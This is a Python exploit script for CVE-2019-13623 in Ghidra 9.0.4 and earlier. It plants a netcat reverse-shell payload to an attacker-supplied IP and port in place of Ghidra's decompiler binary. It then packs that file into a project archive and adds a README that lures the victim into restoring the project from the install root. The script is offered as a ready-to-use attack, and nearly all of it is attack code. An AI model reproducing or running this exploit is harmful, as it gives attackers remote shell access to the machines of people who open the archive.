import os
import inspect
import argparse
import shutil
from shutil import copyfile

print("")
print("")
print("################################################")
print("")
print("------------------CVE-2019-13623----------------")
print("")
print("################################################")
print("")
print("-----------------Ghidra-Exploit-----------------")
print("--Tested version: Ghidra Linux version <= 9.0.4-")
print("------------------------------------------------")
print("")
print("################################################")
print("")
print("----------Exploit by: Etienne Lacoche-----------")
print("---------Contact Twitter: @electr0sm0g----------")
print("")
print("------------------Discovered by:----------------")
print("---------https://blog.fxiao.me/ghidra/----------")
print("")
print("--------Exploit tested on Ubuntu 18.04----------")
print("-----------------Dependency: zip----------------")
print("")
print("################################################")
print("")
print("")

parser = argparse.ArgumentParser()
parser.add_argument("file", help="Path to input export .gar file",default=1)
parser.add_argument("ip", help="Ip to nc listener",default=1)
parser.add_argument("port", help="Port to nc listener",default=1)

args = parser.parse_args()

if args.ip and args.port and args.file:

    rootDirURL=os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
    path = "/home/veronica/ghidra_9.0/Ghidra/Features/Decompiler/os/linux64/decompile"
    os.system("mkdir -p /home/veronica/ghidra_9.0/Ghidra/Features/Decompiler/os/linux64/")
    os.system("echo 'rm -f x; mknod x p && nc "+args.ip+" "+args.port+" 0<x | /bin/bash 1>x' > decompile")
    os.system("chmod +x decompile")
    copyfile("decompile",path)
    copyfile(args.file,rootDirURL+"/"+"project.gar")
    os.system("zip -q project.gar /home/veronica/ghidra_9.0/Ghidra/Features/Decompiler/os/linux64/decompile")
    os.system("echo 'To fully export this archive, place project.gar to GHIDRA_INSTALL_DIR root path and open it with Restore Project at Ghidra.' > README_BEFORE_OPEN_GAR_FILE")
    os.system("zip -q project.zip README_BEFORE_OPEN_GAR_FILE")
    os.system("zip -q project.zip project.gar")
    os.system("rm decompile README_BEFORE_OPEN_GAR_FILE")
    os.system("rm project.gar")
    print("You can now share project.zip and start your local netcat listener.")
    print("")
    print("Project.gar must be placed and opened by victim at GHIDRA_INSTALL_DIR")
    print("root path for payload execution.")
    print("")
